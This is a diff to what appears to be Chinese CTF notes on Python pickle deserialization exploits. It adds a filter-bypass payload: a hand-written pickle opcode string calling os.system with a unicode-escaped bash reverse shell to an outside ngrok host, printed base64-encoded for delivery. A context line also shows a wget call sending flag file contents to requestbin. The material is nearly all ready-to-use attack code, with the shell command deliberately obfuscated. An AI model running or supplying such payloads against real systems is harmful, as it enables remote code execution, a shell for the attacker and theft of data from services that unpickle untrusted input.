@@ -193,3 +193,22 @@ return (os.system, ('wget http://requestbin.net/r/duwbu270?a=`cat fla*`',))
 ```
 
 
+^
+#### **有过滤**
+```
+import pickle
+import pickletools
+import base64
+
+# 有过滤，不让生成的序列化串有i等字符
+
+opcode=b'''(S"key"
+S"val"
+dS"exp"
+(cos
+system
+V\u0062\u0061\u0073\u0068\u0020\u002D\u0063\u0020\u0027\u0062\u0061\u0073\u0068\u0020\u002D\u0069\u0020\u003E\u0026\u0020\u002F\u0064\u0065\u0076\u002F\u0074\u0063\u0070\u002F\u006E\u0067\u0072\u006F\u006B\u002E\u0078\u0069\u0061\u006F\u006D\u0069\u0071\u0069\u0075\u0031\u0032\u0033\u002E\u0074\u006F\u0070\u002F\u0031\u0037\u0031\u0037\u0032\u0020\u0030\u003E\u0026\u0031\u0027
+os.'''
+pickletools.dis(opcode)
+print(base64.b64encode(opcode)) #对反弹shell进行unicode即可。
+```
